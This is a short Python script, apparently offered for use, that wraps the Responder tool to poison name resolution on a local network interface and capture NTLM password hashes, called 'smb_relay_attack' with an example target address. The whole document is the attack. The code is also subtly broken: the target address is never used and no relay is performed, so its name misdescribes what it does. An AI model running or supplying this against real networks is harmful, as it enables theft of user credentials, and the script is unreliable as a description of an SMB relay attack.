import subprocess

def smb_relay_attack(target_ip):
    responder_path = "/path/to/Responder.py"  # Replace with the actual path to Responder.py
    command = f"python {responder_path} -I eth0 -wrf"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print("Responder started successfully. Waiting for NTLM hashes...")
    else:
        print(f"Failed to start Responder: {result.stderr}")

# Example usage
smb_relay_attack("192.168.1.1")